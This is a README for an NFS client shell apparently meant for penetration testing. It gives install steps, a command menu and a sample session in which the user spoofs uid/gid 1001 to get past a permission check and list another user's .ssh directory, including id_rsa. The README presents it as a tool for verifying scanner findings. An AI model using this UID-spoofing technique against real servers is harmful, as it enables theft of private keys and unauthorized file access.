# NFS shell 

Userspace NFS client shell
NFS shell that provides user level access to an NFS server, over UDP or TCP, supports source routing and "secure" (privileged port) mounts. It's a useful tool to manually check (or show) security problems after a security scanner has detected them.

Prerequisites
* Linux System

Dependencies

* libreadline-dev libncurses5-dev git

# Installation
```
- sudo su
- git clone http://github.com/callmezatiel/nfsshell
- cd nfsshell
- chmod +x nfs
- sudo ./nfs

```


# Help menu: 

```
nfs> help 

host <host> - set remote host name 
uid [<uid> [<secret-key>]] - set remote user id 
gid [<gid>] - set remote group id 
cd [<path>] - change remote working directory 
lcd [<path>] - change local working directory 
cat <filespec> - display remote file 
ls [-l] <filespec> - list remote directory 
get <filespec> - get remote files 
df - file system information 
rm <file> - delete remote file 
ln <file1> <file2> - link file 
mv <file1> <file2> - move file 
mkdir <dir> - make remote directory 
rmdir <dir> - remove remote directory 
chmod <mode> <file> - change mode 
chown <uid>[.<gid>] <file> -  change owner 
put <local-file> [<remote-file>] - put file 
mount [-upTU] [-P port] <path> - mount file system 
umount - umount remote file system 
umountall - umount all remote file systems 
export - show all exported file systems 
dump - show all remote mounted file systems 
status - general status report 
help - this help message 
quit - its all in the name 
bye - good bye 
handle [<handle>] - get/set directory file handle 
mknod <name> [b/c major minor] [p] - make device 
```


# Usage

```
root@kali:/opt/nfsshell# ./nfs
nfs> host 192.168.0.45 
Using a privileged port (1021) 
Open 192.168.0.45 (192.168.0.45) TCP 
nfs> export 
Export list for 192.168.0.45: 
/home/karl               *  
nfs> mount /home/zatiel 
Using a privileged port (1020) 
Mount `/home/zatiel', TCP, transfer size 65536 bytes. 
nfs> ls -l 
drwxr-xr-x  3     1001  1001      4096  Apr  5  2023  . 
drwxr-xr-x  3     1001  1001      4096  Apr  5  2023  .. 
drwxr-xr-x  3     1001  1001      4096  Apr  5  2023  .bash_history 
drwxr-xr-x  3     1001  1001      4096  Apr  5  2023  .bash_logout 
drwxr-xr-x  3     1001  1001      4096  Apr  5  2023  .bashrc 
drwxr-xr-x  3     1001  1001      4096  Apr  5  2023  .lesshst 
drwxr-xr-x  3     1001  1001      4096  Apr  5  2023  .profile 
drwxr-xr-x  3     1001  1001      4096  Apr  5  2023  .ssh 
nfs> cd .ssh 
nfs> ls 
Readdir failed: Permission denied 
nfs> uid 1001 
nfs> gid 1001 
nfs> ls 
. 
.. 
authorized_keys 
id_rsa 
id_rsa.pub 
user.txt 
nfs>  
```

## Preview
[![NFSShell.png](https://i.postimg.cc/nL5xRLRN/NFSShell.png)](https://postimg.cc/67dFTBNh)
